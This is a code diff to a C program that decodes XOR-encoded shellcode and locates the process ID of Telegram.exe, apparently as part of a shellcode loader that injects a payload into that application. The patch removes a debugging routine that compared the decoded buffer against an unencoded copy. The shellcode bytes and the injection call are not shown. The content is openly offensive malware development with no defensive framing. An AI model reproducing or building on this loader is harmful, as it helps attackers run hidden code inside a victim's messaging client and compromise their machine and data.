@@ -62,9 +62,8 @@ void compareBuffers(const char* buffer1, const char* buffer2, size_t size) {
 int main()
 {
 	unsigned char key = 0x41;
-	int arrayLen = sizeof(SHELLCODE2);
-	unsigned char* encoded_shellcode = (unsigned char*)SHELLCODE2;
-	unsigned char* not_encoded_shellcode = (unsigned char*)SHELLCODE;
+	int arrayLen = sizeof(SHELLCODE);
+	unsigned char* encoded_shellcode = (unsigned char*)SHELLCODE;
 	UINT32 TargetProcessId = GetProcessIdByName(L"Telegram.exe");
 
 	if (TargetProcessId == 0)
@@ -84,26 +83,6 @@ int main()
 
 	// Decode the shellcode and store it in a buffer
 	decodeBuffer(outputBuffer, arrayLen, encoded_shellcode, TRUE, key);
-
-	//////////////////////////////////////////////////////////////////////////////////
-
-	unsigned char* outputBuffer2 = (unsigned char*)malloc(arrayLen);
-
-	if (outputBuffer2 == NULL) {
-		fprintf(stderr, "Memory allocation failed.\n");
-		exit(EXIT_FAILURE);
-	}
-
-	RtlZeroMemory(outputBuffer2, arrayLen);
-
-	// Decode the shellcode and store it in a buffer
-	decodeBuffer(outputBuffer2, arrayLen, not_encoded_shellcode, FALSE, (unsigned char)NULL);
-
-	//////////////////////////////////////////////////////////////////////////////////
-
-	compareBuffers(outputBuffer, outputBuffer2, arrayLen);
-
-	//////////////////////////////////////////////////////////////////////////////////
 
 	// Now you have the decoded shellcode in the buffer
 	// You can use the buffer and buffer_size as needed
